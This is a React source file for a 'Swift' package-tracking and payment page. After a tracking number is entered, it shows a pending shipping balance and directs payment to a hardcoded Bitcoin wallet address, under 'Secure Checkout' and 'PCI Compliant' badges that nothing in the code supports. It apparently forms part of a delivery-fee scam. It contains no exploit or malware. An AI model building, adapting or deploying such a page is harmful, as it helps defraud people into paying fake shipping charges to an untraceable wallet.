import React, { useState, useEffect } from 'react';
import { Link } from 'react-router-dom';
import './PaymentPage.css';
import { getShippingDetails } from '../services/Service';
import HTMLPopup from '../components/HTMLPopup';

const PaymentPage = () => {
  const [shippingNumber, setShippingNumber] = useState('');
  const [shippingInfo, setShippingInfo] = useState(null);
  const [error, setError] = useState('');
  const [showExtras, setShowExtras] = useState(false);
  // eslint-disable-next-line
  const [showPopup, setShowPopup] = useState(false);
  const [copyMessage, setCopyMessage] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const hiddenText = 'bc1qp96zt0g87kwgt7v6md2str5ksjtmlqpfkdtlh3';

  useEffect(() => {
    if (showPopup) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = 'unset';
    }
    
    return () => {
      document.body.style.overflow = 'unset';
    };
  }, [showPopup]);

  const handleCheck = async () => {
    setIsLoading(true);
    try {
      const details = await getShippingDetails(shippingNumber.trim());
      setShippingInfo(details);
      setError('');
    } catch (err) {
      setError('Invalid tracking number.');
      setShippingInfo(null);
    } finally {
      setIsLoading(false);
    }
  };

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(hiddenText);
      setCopyMessage('Copied to clipboard!');
      setTimeout(() => setCopyMessage(''), 2000);
    } catch {
      setCopyMessage('Failed to copy');
    }
  };

  return (
    <div className="premium-payment-container">
      <div className="premium-glass-card">
        <div className="premium-header">
          <div className="premium-logo">
            <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M16 0C7.163 0 0 7.163 0 16C0 24.837 7.163 32 16 32C24.837 32 32 24.837 32 16C32 7.163 24.837 0 16 0ZM16 28C9.373 28 4 22.627 4 16C4 9.373 9.373 4 16 4C22.627 4 28 9.373 28 16C28 22.627 22.627 28 16 28Z" fill="#5c9dff"/>
              <path d="M22 12H10V14H22V12Z" fill="#5c9dff"/>
              <path d="M22 18H10V20H22V18Z" fill="#5c9dff"/>
            </svg>
            <span>Swift</span>
          </div>
          <div className="premium-steps">
            <div className="step active">1. Shipping</div>
            <div className={`step ${shippingInfo ? 'active' : ''}`}>2. Payment</div>
            <div className="step">3. Complete</div>
          </div>
        </div>

        {!shippingInfo ? (
          <>
            <div className="premium-input-section">
              <h1 className="premium-title">Track Your Package</h1>
              <p className="premium-subtitle">Enter your tracking number to view details and make payment</p>
              
              <div className={`premium-input-group ${error ? 'error' : ''}`}>
                <input
                  type="text"
                  placeholder=" "
                  value={shippingNumber}
                  onChange={(e) => setShippingNumber(e.target.value)}
                  onKeyDown={(e) => e.key === 'Enter' && handleCheck()}
                  className="premium-input"
                />
                <label className="premium-label">Tracking Number</label>
                <div className="premium-input-border"></div>
              </div>
              {error && <p className="premium-error-message">{error}</p>}
              
              <button 
                className="premium-button primary" 
                onClick={handleCheck}
                disabled={isLoading || !shippingNumber.trim()}
              >
                {isLoading ? (
                  <div className="premium-spinner"></div>
                ) : (
                  'Continue'
                )}
              </button>
              
              <div className="premium-help-text">
                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M8 0C3.6 0 0 3.6 0 8C0 12.4 3.6 16 8 16C12.4 16 16 12.4 16 8C16 3.6 12.4 0 8 0ZM8 14C4.7 14 2 11.3 2 8C2 4.7 4.7 2 8 2C11.3 2 14 4.7 14 8C14 11.3 11.3 14 8 14Z" fill="#6B7280"/>
                  <path d="M9 12H7V7H9V12Z" fill="#6B7280"/>
                  <path d="M8 5C8.55228 5 9 4.55228 9 4C9 3.44772 8.55228 3 8 3C7.44772 3 7 3.44772 7 4C7 4.55228 7.44772 5 8 5Z" fill="#6B7280"/>
                </svg>
                <Link to="/support?faq=tracking" className="premium-help-link">
                  Where can I find my tracking number?
                </Link>
              </div>
            </div>
          </>
        ) : showExtras ? (
          <div className="premium-extra-content">
           
            <h2 className="premium-extra-title">Pay With Bitcoin</h2>
            <p className="premium-extra-subtitle">Scan the QR code or copy the address </p>
            
            <div className="premium-image-container">
              <img
                src="/assets/shipping-preview.jpg"
                alt="QR"
                className="premium-preview-image"
              />
              <div className="..">
                <div className="..">
                </div>
              </div>
            </div>
            
            <div className="premium-hidden-code">
              <div className="premium-code-header">
                <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M17.5 12.5V15.8333C17.5 16.2754 17.3244 16.6993 17.0118 17.0118C16.6993 17.3244 16.2754 17.5 15.8333 17.5H4.16667C3.72464 17.5 3.30072 17.3244 2.98816 17.0118C2.67559 16.6993 2.5 16.2754 2.5 15.8333V12.5" stroke="#5c9dff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  <path d="M5.83398 8.33333L10.0007 12.5L14.1673 8.33333" stroke="#5c9dff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  <path d="M10 12.5V2.5" stroke="#5c9dff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
                <span>Bitcoin Address</span>
              </div>
              <div className="premium-code-content">
                <input
                  type="text"
                  value={hiddenText}
                  readOnly
                  className="premium-code-input"
                />
                <button 
                  className="premium-copy-button" 
                  onClick={handleCopy}
                  aria-label="Copy code"
                >
                  {copyMessage ? (
                    <span className="premium-copy-message">{copyMessage}</span>
                  ) : (
                    <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <path d="M13.3333 13.3333H16.6667V3.33333H6.66667V6.66667" stroke="#5c9dff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                      <path d="M13.3333 6.66667H3.33333V16.6667H13.3333V6.66667Z" stroke="#5c9dff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                  )}
                </button>
              </div>
            </div>
            
            <button 
              className="premium-button secondary" 
              onClick={() => setShowExtras(false)}
            >
              Exit
            </button>
          </div>
        ) : (
          <>
            <div className="premium-payment-section">
              <div className="premium-payment-header">
                <h1 className="premium-payment-title">Complete Your Payment</h1>
                <p className="premium-payment-subtitle">Review your shipping details and select a payment method</p>
              </div>
              
              <div className="premium-shipping-details">
                <div className="premium-detail-card">
                  <div className="premium-card-header">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <path d="M12 12C14.2091 12 16 10.2091 16 8C16 5.79086 14.2091 4 12 4C9.79086 4 8 5.79086 8 8C8 10.2091 9.79086 12 12 12Z" stroke="#5c9dff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                      <path d="M6 20V18C6 16.8954 6.89543 16 8 16H16C17.1046 16 18 16.8954 18 18V20" stroke="#5c9dff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                    <h3>Recipient Information</h3>
                  </div>
                  <div className="premium-card-content">
                    <div className="premium-detail-row">
                      <span className="premium-detail-label">Name:</span>
                      <span className="premium-detail-value">{shippingInfo.recipient}</span>
                    </div>
                    <div className="premium-detail-row">
                      <span className="premium-detail-label">Contact:</span>
                      <span className="premium-detail-value">{shippingInfo.contact || 'N/A'}</span>
                    </div>
                    <div className="premium-detail-row">
                      <span className="premium-detail-label">Address:</span>
                      <span className="premium-detail-value">{shippingInfo.address}</span>
                    </div>
                  </div>
                </div>
                
                <div className="premium-detail-card">
                  <div className="premium-card-header">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <path d="M12 2L3 7V17L12 22L21 17V7L12 2Z" stroke="#5c9dff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                      <path d="M3 7L12 12" stroke="#5c9dff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                      <path d="M21 7L12 12" stroke="#5c9dff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                      <path d="M12 12V22" stroke="#5c9dff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                    <h3>Shipping Details</h3>
                  </div>
                  <div className="premium-card-content">
                    <div className="premium-detail-row">
                      <span className="premium-detail-label">Method:</span>
                      <span className="premium-detail-value">{shippingInfo.method}</span>
                    </div>
                    <div className="premium-detail-row">
                      <span className="premium-detail-label">Tracking #:</span>
                      <span className="premium-detail-value">{shippingInfo.trackingId || 'N/A'}</span>
                    </div>
                    <div className="premium-detail-row">
                      <span className="premium-detail-label">Status:</span>
                      <span className={`premium-detail-value status-${shippingInfo.status.toLowerCase().replace(' ', '-')}`}>
                        {shippingInfo.status}
                      </span>
                    </div>
                  </div>
                </div>
                
                <div className="premium-summary-card">
                  <div className="premium-card-header">
                    <h3>Order Summary</h3>
                  </div>
                  <div className="premium-card-content">
                    {Object.entries(shippingInfo.orderSummary).map(([key, value]) => {
                      if (key === 'total') return null;
                      return (
                        <div className="premium-summary-row" key={key}>
                          <div>
                            <span>{key.charAt(0).toUpperCase() + key.slice(1).replace(/([A-Z])/g, ' $1')}</span>
                            {value.paid && (
                              <span className="premium-paid-badge">
                                <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
                                  <path d="M7 0C3.134 0 0 3.134 0 7C0 10.866 3.134 14 7 14C10.866 14 14 10.866 14 7C14 3.134 10.866 0 7 0Z" fill="#10B981"/>
                                  <path d="M10 5L6 9L4 7" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                                </svg>
                                Paid
                              </span>
                            )}
                          </div>
                          <span>${value.amount.toFixed(2)}</span>
                        </div>
                      );
                    })}
                    <div className="premium-summary-divider"></div>
                    <div className="premium-summary-row total">
                      <span>Pending Amount</span>
                      <span>${shippingInfo.orderSummary.total.toFixed(2)}</span>
                    </div>
                  </div>
                </div>
              </div>
              
              <div className="premium-payment-actions">
                <HTMLPopup />    
                <button 
                  className="premium-button secondary" 
                  onClick={() => {
                    setShowExtras(true);
                    window.scrollTo({ top: 0, behavior: 'smooth' });
                  }}
                >
                  <img src="/assets/bitcoin.jpg" alt="Bitcoin" />
                </button>
              </div>
            </div>
            
            <div className="premium-footer">
              <div className="premium-security-badges">
                <div className="premium-badge">
                  <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M10 18C14.4183 18 18 14.4183 18 10C18 5.58172 14.4183 2 10 2C5.58172 2 2 5.58172 2 10C2 14.4183 5.58172 18 10 18Z" stroke="#10B981" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    <path d="M6 10L9 13L14 7" stroke="#10B981" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                  <span>Secure Checkout</span>
                </div>
                <div className="premium-badge">
                  <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M16 8V6C16 3.79086 14.2091 2 12 2H8C5.79086 2 4 3.79086 4 6V8" stroke="#3B82F6" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    <path d="M16 14V12C16 9.79086 14.2091 8 12 8H8C5.79086 8 4 9.79086 4 12V14" stroke="#3B82F6" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    <path d="M16 18C16 15.7909 14.2091 14 12 14H8C5.79086 14 4 15.7909 4 18" stroke="#3B82F6" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                  <span>PCI Compliant</span>
                </div>
              </div>
              <p className="premium-copyright">© 2025 Swift. All rights reserved.</p>
            </div>
          </>
        )}
      </div>
    </div>
  );
};

export default PaymentPage;